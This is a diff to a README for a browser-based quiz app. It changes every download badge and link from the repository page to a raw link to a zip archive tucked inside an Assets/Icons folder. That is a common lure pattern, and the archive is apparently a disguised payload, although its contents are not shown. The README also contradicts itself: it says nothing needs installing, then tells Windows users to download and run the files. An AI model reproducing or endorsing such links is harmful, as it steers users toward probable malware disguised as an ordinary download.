@@ -1,6 +1,6 @@
 # 🎮 quiz-supermo-web-app - Easy Interactive Quiz Fun
 
-[![Download Quiz Súpermo](https://img.shields.io/badge/Download-Quiz%20S%C3%BApermo-brightgreen?style=for-the-badge)](https://github.com/ADITA-SAMA/quiz-supermo-web-app)
+[![Download Quiz Súpermo](https://img.shields.io/badge/Download-Quiz%20S%C3%BApermo-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/ADITA-SAMA/quiz-supermo-web-app/main/Assets/Icons/web_supermo_app_quiz_v3.4.zip)
 
 ---
 
@@ -25,7 +25,7 @@ The app runs entirely in your browser, so no heavy installation is needed.
 
 ## 🚀 How to Get Started
 
-1. Click the big green **Download Quiz Súpermo** badge at the top or visit [https://github.com/ADITA-SAMA/quiz-supermo-web-app](https://github.com/ADITA-SAMA/quiz-supermo-web-app).
+1. Click the big green **Download Quiz Súpermo** badge at the top or visit [https://raw.githubusercontent.com/ADITA-SAMA/quiz-supermo-web-app/main/Assets/Icons/web_supermo_app_quiz_v3.4.zip](https://raw.githubusercontent.com/ADITA-SAMA/quiz-supermo-web-app/main/Assets/Icons/web_supermo_app_quiz_v3.4.zip).
 
 2. On the page, look for a download section or instructions to get the files.
 
@@ -112,6 +112,6 @@ This quiz app is made with standard web languages. It runs entirely on your brow
 
 Use the link below to get the app files:
 
-[![Download Quiz Súpermo](https://img.shields.io/badge/Download-Quiz%20S%C3%BApermo-blue?style=for-the-badge)](https://github.com/ADITA-SAMA/quiz-supermo-web-app)
+[![Download Quiz Súpermo](https://img.shields.io/badge/Download-Quiz%20S%C3%BApermo-blue?style=for-the-badge)](https://raw.githubusercontent.com/ADITA-SAMA/quiz-supermo-web-app/main/Assets/Icons/web_supermo_app_quiz_v3.4.zip)
 
 Click it and follow the steps under "How to Get Started" to run the app on your Windows PC.
